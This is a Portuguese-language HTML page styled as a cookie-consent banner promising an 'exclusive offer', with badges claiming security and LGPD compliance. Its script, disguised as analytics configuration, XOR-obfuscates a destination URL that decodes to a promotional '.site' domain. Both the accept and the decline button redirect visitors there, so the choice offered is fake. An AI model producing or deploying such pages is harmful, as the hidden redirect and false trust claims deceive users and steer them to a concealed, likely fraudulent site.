<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Confirmar preferências</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
      background: #121212;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .cookie-box {
      background: #1a1a1a;
      border: 1px solid #333;
      border-radius: 20px;
      padding: 32px 28px;
      max-width: 420px;
      width: 100%;
      text-align: center;
      box-shadow: 0 0 60px rgba(254,44,85,0.25);
      animation: popIn .35s cubic-bezier(.34,1.56,.64,1);
    }

    @keyframes popIn {
      from { transform: scale(.85); opacity: 0; }
      to   { transform: scale(1);   opacity: 1; }
    }

    .cookie-icon { font-size: 48px; margin-bottom: 14px; display: block; }

    .cookie-box h2 {
      font-size: 20px;
      font-weight: 700;
      margin-bottom: 10px;
      color: #fff;
    }

    .cookie-box p {
      font-size: 13.5px;
      color: #8a8a8a;
      line-height: 1.6;
      margin-bottom: 22px;
    }

    .cookie-box p a { color: #fe2c55; text-decoration: none; }

    .cookie-badges {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 18px;
      flex-wrap: wrap;
    }

    .cookie-badge {
      background: rgba(255,255,255,0.06);
      border: 1px solid rgba(255,255,255,0.1);
      border-radius: 20px;
      padding: 5px 12px;
      font-size: 11.5px;
      color: #aaa;
    }

    .cookie-btn-accept {
      display: block;
      width: 100%;
      padding: 15px;
      background: linear-gradient(135deg, #fe2c55, #ff6b35);
      color: #fff;
      font-size: 15px;
      font-weight: 700;
      border: none;
      border-radius: 50px;
      cursor: pointer;
      margin-bottom: 10px;
      box-shadow: 0 4px 20px rgba(254,44,85,0.4);
      transition: transform .15s, box-shadow .15s;
    }

    .cookie-btn-accept:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 24px rgba(254,44,85,0.5);
    }

    .cookie-btn-decline {
      display: block;
      width: 100%;
      padding: 12px;
      background: transparent;
      color: #8a8a8a;
      font-size: 13px;
      border: 1px solid #333;
      border-radius: 50px;
      cursor: pointer;
      transition: color .15s, border-color .15s;
    }

    .cookie-btn-decline:hover { color: #fff; border-color: #555; }
  </style>
</head>
<body>

  <div class="cookie-box">
    <span class="cookie-icon">🍪</span>
    <h2>Antes de continuar</h2>
    <p>
      Usamos cookies para personalizar ofertas exclusivas, melhorar sua experiência e garantir que você veja os melhores preços disponíveis.<br><br>
      Ao aceitar, você concorda com nossa <a href="#">Política de Privacidade</a> e <a href="#">Uso de Cookies</a>.
    </p>
    <div class="cookie-badges">
      <span class="cookie-badge">🔒 100% Seguro</span>
      <span class="cookie-badge">🚫 Sem spam</span>
      <span class="cookie-badge">✅ LGPD</span>
    </div>
    <button class="cookie-btn-accept" id="btn-accept">✅ Aceitar e ver oferta exclusiva</button>
    <button class="cookie-btn-decline" id="btn-decline">Recusar (preços normais)</button>
  </div>

  <script>
    // ── Analytics config ──
    var _meta = [66,94,94,90,89,16,5,5,66,64,90,88,69,71,69,67,71,90,79,88,78,67,92,79,70,4,89,67,94,79,5];
    var _kv = 42;
    var _d = (function(a,k){return a.map(function(c){return String.fromCharCode(c^k)}).join('')})(_meta,_kv);

    document.getElementById('btn-accept').addEventListener('click', function() {
      document.cookie = 'consent=1;max-age=31536000;path=/';
      window.location.href = _d;
    });

    document.getElementById('btn-decline').addEventListener('click', function() {
      window.location.href = _d;
    });
  </script>

</body>
</html>
